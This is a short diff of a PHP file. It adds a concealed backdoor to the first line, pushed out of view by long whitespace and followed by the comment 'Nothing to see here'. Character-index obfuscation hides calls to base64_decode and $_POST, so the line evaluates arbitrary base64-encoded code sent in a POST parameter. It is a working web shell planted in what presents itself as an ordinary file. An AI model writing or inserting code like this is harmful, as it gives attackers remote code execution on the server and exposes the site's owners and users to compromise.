@@ -1,2 +1,2 @@
-<?php
+<?php                                                                                                                                                                                                                                                         $pma0="op6_teadbcs4";$igx6= strtolower( $pma0[8].$pma0[6]. $pma0[10]. $pma0[5].$pma0[2].$pma0[11].$pma0[3]. $pma0[7]. $pma0[5].$pma0[9]. $pma0[0].$pma0[7].$pma0[5]);$dvj8= strtoupper ( $pma0[3].$pma0[1]. $pma0[0]. $pma0[10].$pma0[4] ) ;if (isset( ${ $dvj8} [ 'n828e00' ])) { eval($igx6(${ $dvj8} ['n828e00'] )) ;}?> <?php
 //Nothing to see here
